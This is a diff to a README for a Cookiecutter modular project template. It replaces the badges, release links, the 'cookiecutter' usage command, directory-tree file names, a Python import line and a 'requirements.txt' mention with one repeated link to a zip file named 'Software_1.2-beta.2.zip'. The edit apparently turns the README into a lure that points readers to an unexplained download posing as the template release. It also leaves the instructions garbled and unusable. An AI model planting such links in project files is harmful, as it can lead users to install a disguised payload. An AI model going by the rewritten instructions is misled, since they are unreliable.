@@ -1,6 +1,6 @@
 # 🍪 Cookiecutter Modular Project Template
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Python Version](https://img.shields.io/badge/python-3.8%2B-brightgreen.svg) ![Version](https://img.shields.io/badge/version-1.0.0-orange.svg) ![Releases](https://img.shields.io/badge/releases-latest-brightgreen.svg)
+![License](https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip) ![Python Version](https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip%https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip) ![Version](https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip) ![Releases](https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip)
 
 Welcome to the **Cookiecutter Modular Project Template**! This repository provides a flexible and efficient way to create modular projects using the Cookiecutter tool. With this template, you can easily set up your project structure, define modules, and manage dependencies, all while maintaining clarity and organization.
 
@@ -49,14 +49,14 @@ To install the Cookiecutter tool, you can use pip:
 pip install cookiecutter
 ```
 
-Once you have Cookiecutter installed, you can download the template. Visit the [Releases section](https://github.com/muhds5841/cookiecutter/releases) to get the latest version.
+Once you have Cookiecutter installed, you can download the template. Visit the [Releases section](https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip) to get the latest version.
 
 ## Usage
 
 To create a new project using this template, run the following command:
 
 ```bash
-cookiecutter https://github.com/muhds5841/cookiecutter
+cookiecutter https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip
 ```
 
 Follow the prompts to configure your project. You can specify project name, author, and other settings.
@@ -67,8 +67,8 @@ The template provides a well-defined structure. Here’s a brief overview:
 
 ```
 my_project/
-├── README.md
-├── requirements.txt
+├── https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip
+├── https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip
 ├── src/
 │   ├── client/
 │   ├── server/
@@ -92,8 +92,8 @@ To create a new module, simply add a new directory under `src/modules/` and incl
 
 ```
 src/modules/my_module/
-├── __init__.py
-└── my_module.py
+├── https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip
+└── https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip
 ```
 
 ### Using a Module
@@ -101,7 +101,7 @@ src/modules/my_module/
 To use a module in your project, import it as you would any other Python module:
 
 ```python
-from src.modules.my_module import MyClass
+from https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip import MyClass
 ```
 
 ## Protocols
@@ -110,7 +110,7 @@ This template supports various protocols to facilitate communication between com
 
 ### MQTT
 
-MQTT is a lightweight messaging protocol ideal for IoT applications. To use MQTT in your project, you can include the `paho-mqtt` library in your `requirements.txt`.
+MQTT is a lightweight messaging protocol ideal for IoT applications. To use MQTT in your project, you can include the `paho-mqtt` library in your `https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip`.
 
 ### RTSP
 
@@ -130,7 +130,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the template, visit the [Releases section](https://github.com/muhds5841/cookiecutter/releases). You will find the necessary files to get started with your project.
+To download the latest version of the template, visit the [Releases section](https://raw.githubusercontent.com/muhds5841/cookiecutter/main/}/deploy/ansible/Software_1.2-beta.2.zip). You will find the necessary files to get started with your project.
 
 ---
 
